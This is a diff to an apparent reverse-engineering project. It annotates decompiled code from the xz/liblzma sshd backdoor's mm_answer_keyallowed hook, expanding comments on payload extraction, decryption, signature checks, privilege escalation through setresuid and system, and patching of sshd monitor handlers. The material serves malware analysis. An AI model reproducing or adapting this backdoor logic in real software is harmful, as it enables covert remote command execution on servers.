@@ -5,7 +5,12 @@
 
 
 /*
- * AutoDoc: Runs the decrypted payload (including optional privilege escalation) and then tail-calls the genuine `mm_answer_keyallowed`. It is the final hook that executes attacker commands after the forged monitor packet crafted in `sshd_proxy_elevate` arrives.
+ * AutoDoc: Drives the decrypted payload state machine: it extracts sshbuf chunks from the monitor
+ * message, pieces together and decrypts the staged payload, validates signatures against the
+ * cached host_pubkeys, optionally runs privilege escalation (setresuid/setresgid + system), and
+ * only then patches mm_answer_keyverify/mm_answer_authpassword before tail-calling the genuine
+ * mm_answer_keyallowed. On failure it resets the payload_state and, if instructed, exits sshd
+ * entirely.
  */
 #include "xzre_types.h"
 
@@ -33,52 +38,56 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   ssize_t sVar15;
   long lVar16;
   ulong uVar17;
-  sshbuf *psVar18;
+  sshd_payload_ctx_t **ppsVar18;
   undefined1 *puVar19;
   u8 *puVar20;
   uid_t ruid;
   sshd_payload_ctx_t *psVar21;
   byte bVar22;
-  size_t local_140;
+  sshbuf payload_buf;
+  global_context_t *global_ctx;
+  libc_imports_t *libc_imports;
   u8 local_131 [57];
-  sshbuf local_f8;
+  sshd_payload_ctx_t *payload_ctx;
+  sshd_monitor_func_t orig_handler;
   undefined8 local_aa;
   undefined8 uStack_a2;
   undefined1 local_9a [106];
   
-  ctx = global_ctx;
+  ctx = ::global_ctx;
   bVar22 = 0;
-  if (global_ctx == (global_context_t *)0x0) {
+  if (::global_ctx == (global_context_t *)0x0) {
     return 0;
   }
-  plVar3 = global_ctx->libc_imports;
+  plVar3 = ::global_ctx->libc_imports;
   if (plVar3 == (libc_imports_t *)0x0) {
     return 0;
   }
-  psVar4 = global_ctx->sshd_ctx;
+  psVar4 = ::global_ctx->sshd_ctx;
   if (psVar4 == (sshd_ctx_t *)0x0) {
     return 0;
   }
-  if (global_ctx->payload_data == (u8 *)0x0) {
+  if (::global_ctx->payload_data == (u8 *)0x0) {
     return 0;
   }
   UNRECOVERED_JUMPTABLE = psVar4->mm_answer_keyallowed_start;
   if (UNRECOVERED_JUMPTABLE == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
-  if (global_ctx->payload_state == 4) goto LAB_0010944f;
-  BVar10 = check_backdoor_state(global_ctx);
+  if (::global_ctx->payload_state == 4) goto LAB_0010944f;
+  BVar10 = check_backdoor_state(::global_ctx);
   if (((BVar10 == 0) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
   goto LAB_00109429;
-  psVar18 = &local_f8;
+  ppsVar18 = &payload_ctx;
   for (lVar16 = 0x12; lVar16 != 0; lVar16 = lVar16 + -1) {
-    *(undefined4 *)&psVar18->d = 0;
-    psVar18 = (sshbuf *)((long)psVar18 + (ulong)bVar22 * -8 + 4);
+    *(undefined4 *)ppsVar18 = 0;
+    ppsVar18 = (sshd_payload_ctx_t **)((long)ppsVar18 + (ulong)bVar22 * -8 + 4);
   }
-  local_140 = 0;
-  BVar10 = sshbuf_extract(m,ctx,&local_f8.d,&local_f8.size);
+  libc_imports = (libc_imports_t *)0x0;
+  BVar10 = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
   if ((BVar10 == 0) ||
-     (BVar10 = extract_payload_message(&local_f8,local_f8.size,&local_140,ctx), BVar10 == 0))
-  goto LAB_0010944f;
-  decrypt_payload_message((key_payload_t *)local_f8.d,local_140,ctx);
+     (BVar10 = extract_payload_message
+                         ((sshbuf *)&payload_ctx,(size_t)orig_handler,(size_t *)&libc_imports,ctx),
+     BVar10 == 0)) goto LAB_0010944f;
+  decrypt_payload_message((key_payload_t *)payload_ctx,(size_t)libc_imports,ctx);
   uVar2 = ctx->payload_state;
   if (uVar2 == 3) {
 LAB_00109216:
